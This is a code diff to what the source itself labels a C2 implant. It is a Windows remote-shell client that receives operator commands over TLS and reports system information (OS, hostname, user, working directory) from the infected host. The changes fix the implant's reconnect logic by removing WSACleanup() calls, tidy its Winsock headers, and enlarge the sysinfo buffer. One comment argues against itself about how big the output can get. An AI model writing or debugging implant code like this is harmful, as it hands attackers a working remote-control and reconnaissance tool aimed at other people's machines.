@@ -64,13 +64,13 @@
 #include "shell.h"
 #include "config.h"
 #include "ntcalls.h"
-#include "../tls/tls_client.h"
+#include "../tls/tls_client.h"   /* brings Windows.h + WIN32_LEAN_AND_MEAN */
 
-#ifndef WIN32_LEAN_AND_MEAN
-#define WIN32_LEAN_AND_MEAN
-#endif
-#include <Windows.h>
-#include <winsock2.h>
+/* Do NOT re-define WIN32_LEAN_AND_MEAN here — tls_client.h already did it.
+ * Re-defining it after Windows.h has already been pulled in is harmless but
+ * misleading; including winsock2.h explicitly after Windows.h would cause
+ * winsock.h/winsock2.h redefinition warnings on some SDK versions.          */
+#include <winsock2.h>   /* needed for WSACleanup() */
 #include <stdio.h>
 #include <string.h>
 #include <stdlib.h>
@@ -104,20 +104,25 @@ void shell_run(TLS_CONTEXT *pTls)
         const char *cmd = (const char *)pCmd;
 
         /* ── "exit" — C2 standard disconnect ─────────────────────── */
+        /* BUG: shell_run() must NOT call WSACleanup() — that is
+         * main.c's responsibility.  Calling it here causes the Winsock
+         * stack to be torn down while main.c still owns the socket,
+         * which makes closesocket() in the reconnect loop fail silently.
+         * tls_disconnect() is still correct here: it sends close_notify
+         * and frees TLS buffers before control returns to main.c.       */
         if (cbCmd >= 4 && strncmp("exit", cmd, 4) == 0) {
             free(pCmd); pCmd = NULL;
             tls_disconnect(pTls);
-            WSACleanup();
             return;
         }
 
         /* ── "q" — standalone serverShell.c compat ──────────────── */
-        /* FIX: cbCmd >= 1 + strncmp(1) also matches "quit", "queue", etc.
-         * The "q" verb is exactly one character; require exact length.   */
+        /* BUG: same WSACleanup() issue as "exit"; same fix.
+         * cbCmd == 1 exact-length guard is correct (prevents matching
+         * "quit", "queue", etc.).                                       */
         if (cbCmd == 1 && cmd[0] == 'q') {
             free(pCmd); pCmd = NULL;
             tls_disconnect(pTls);
-            WSACleanup();
             return;
         }
 
@@ -258,7 +263,14 @@ static void _handle_sysinfo(TLS_CONTEXT *pTls)
     else if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_ARM64)
         arch = "ARM64";
 
-    char buf[1024] = {0};
+    /* BUG: 1024 bytes is too small when hostname + username + cwd are long.
+     * e.g. "Windows 10.0 (Build 19045)\n" + MAX_COMPUTERNAME_LENGTH(15) +
+     * UNLEN(256) + MAX_PATH(260) + arch(5) + format overhead = ~700 chars
+     * in the worst case — but GetCurrentDirectory can return up to 32767
+     * chars on modern Windows (with long-path support enabled).
+     * Use a 4 KB stack buffer; the message is still bounded by the
+     * field widths above (MAX_PATH + UNLEN + MAX_COMPUTERNAME_LENGTH).  */
+    char buf[4096] = {0};
     _snprintf(buf, sizeof(buf) - 1,
         "[*] System Information\n"
         "    OS:           Windows %lu.%lu (Build %lu)\n"
